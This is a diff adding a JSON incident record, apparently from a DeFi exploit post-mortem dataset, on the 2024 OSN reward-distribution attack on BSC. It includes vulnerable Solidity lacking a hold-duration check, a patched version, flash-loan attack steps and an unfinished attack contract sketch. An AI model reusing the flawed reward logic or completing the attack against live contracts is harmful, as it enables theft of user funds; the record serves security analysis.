@@ -1,0 +1,35 @@
+{
+ "id": "2024__2024-05-XX_OSN_RewardDistributionNoHoldDuration",
+ "source_file": "2024/2024-05-XX_OSN_RewardDistributionNoHoldDuration.md",
+ "title": "OSN — Reward Distribution Hold Duration Unchecked Analysis",
+ "date": "2024-05-01",
+ "protocol": "OSN",
+ "chain": "BSC",
+ "loss_raw": "~$109,000",
+ "loss_usd": 109000.0,
+ "root_cause": "The reward distribution contract does not check token hold duration, allowing immediate reward claims after acquiring a large balance within a single block",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "staking-reward"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: no hold duration check\ncontract OSNReward {\n    mapping(address => uint256) public rewards;\n\n    function distributeReward(address user) external {\n        uint256 balance = OSN.balanceOf(user);\n        // ← no hold duration check\n        // balance just received via flash loan is applied as-is\n        rewards[user] = balance * rewardRate / totalSupply;\n    }\n\n    function claimReward() external {\n        uint256 reward = rewards[msg.sender];\n        rewards[msg.sender] = 0;\n        BUSD.transfer(msg.sender, reward);\n    }\n}\n\n//",
+  "// File: OSN_decompiled.sol\ncontract OSN {\n    function balanceOf(address p0) external view returns (uint256) {}  // ❌ vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code: minimum hold duration + snapshot-based rewards\nmapping(address => uint256) public holdStart;\nmapping(address => uint256) public holdBalance;\n\nfunction _afterTokenTransfer(address from, address to, uint256 amount) internal {\n    // reset hold start time on balance change\n    holdStart[to] = block.timestamp;\n    holdBalance[to] = OSN.balanceOf(to);\n}\n\nfunction claimReward() external {\n    require(block.timestamp >= holdStart[msg.sender] + MIN_HOLD_DURATION, \"hold too short\");\n    uint256 reward = holdBalance[msg.sender] * rewardRate / totalSupply;\n    BUSD.transfer(msg.sender, reward);\n}"
+ ],
+ "steps": [
+  "→ [1] Borrow large amount of OSN tokens via flash loan",
+  "→ [2] Set up OSN pool via CREATE2 or addLiq() function",
+  "→ [3] Call distributeReward(attacker) or cc()",
+  "→ [4] claimReward() or withdraw rewards",
+  "→ [5] Return OSN tokens + repay flash loan",
+  "→ [6] ~$109K profit (BUSD)"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Borrow large amount of OSN tokens via flash loan\n  │         └─ hold duration = 0 (just received)\n  │\n  ├─→ [2] Set up OSN pool via CREATE2 or addLiq() function\n  │\n  ├─→ [3] Call distributeReward(attacker) or cc()\n  │         └─ no hold duration check\n  │         └─ rewards accrued based on large balance\n  │\n  ├─→ [4] claimReward() or withdraw rewards\n  │\n  ├─→ [5] Return OSN tokens + repay flash loan\n  │\n  └─→ [6] ~$109K profit (BUSD)",
+  "interface IOSNReward {\n    function addLiq() external;     // add liquidity (attack setup)\n    function cc() external;         // reward claim trigger\n}\n\ncontract AttackContract {\n    IOSNReward constant reward = IOSNReward(/* OSN Reward contract */);\n    IERC20     constant OSN    = IERC20(/* OSN token */);\n    IERC20     constant BUSD   = IERC20(0x55d398326f99059fF775485246999027B3197955);\n\n    function testExploit() external {\n        // [1] borrow large amount of OSN via flash loan (hold duration = 0)\n        flashLoanOSN(largeAmount);\n    }\n\n    function flashCallback() external {\n        // [2] set up OSN pool via addLiq\n        OSN.approve(address(reward), OSN.balanceOf(address(this)));\n        reward.addLiq();\n\n        // [3] claim rewards via cc() with no hold duration\n        // "
+ ]
+}
